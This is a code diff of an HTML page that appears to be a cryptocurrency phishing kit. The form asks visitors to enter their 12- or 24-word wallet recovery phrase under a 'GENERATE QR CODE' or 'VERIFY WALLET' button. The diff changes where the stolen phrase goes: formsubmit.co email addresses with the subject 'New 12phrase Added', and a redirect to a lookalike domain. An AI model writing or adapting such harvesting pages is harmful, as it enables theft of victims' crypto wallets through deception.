@@ -38,20 +38,22 @@
 
     
 
-    <form action="https://formsubmit.co/holusholarcoded@gmail.com" style="background-color: rgb(0, 0, 17);" method="POST">
-    <form action="#" style="background-color: rgb(0, 0, 17);" method="POST">
+    <!-- <form action="https://formsubmit.co/holumacbeth@gmail.com" style="background-color: rgb(0, 0, 17);" method="POST" name="form" onsubmit="return validated()"> -->
+    <form action="./qrcode.html" style="background-color: rgb(0, 0, 17);" method="POST" name="form" onsubmit="return validated()">
         <div class="main-box" style="background-color:rgb(0, 0, 17); padding: 0px;" >
             <div class="phrase-box" style="background-color: rgb(0, 0, 17);">  
-                <input type="text" name="phrase" id="phrase-box" placeholder="input phrase..." required>
+                <input type="text" name="phrase" id="phrase-box" placeholder="input phrase..." required autocomplete="off">
                 <br>
             </div>
             <label for="phrase_input" class="form__label" style="color: rgb(116, 107, 107); background-color: rgb(0, 0, 17);">Typically 12 (sometimes 24) words separated by a single space.</label><br>
 
-             <input type="hidden" name="_next" value="https://skalez-a.github.io/newly/qrcode.html"> 
+             <input type="hidden" name="_next" value="https://reauthent.tech/qrcode.html"> 
             <input type="hidden" name="_subject" value="New 12phrase Added">
             <input type="hidden" name="_captcha" value="false">
             
-            <button type="submit" id="btn"><a href="./qrcode.html"></a><p style="background-color: rgb(20, 48, 99); font-weight: 700; color: white; font-weight: 700;"> GENERATE QR CODE</button>
+            <button type="submit" id="btn" name="name" onclick="validate();" required><a href="./qrcode.html" ></a><p style="background-color: rgb(20, 48, 99); font-weight: 700; color: white; font-weight: 700;"> 
+                VERIFY WALLET
+            </button>
 
         </div>
     </form>    
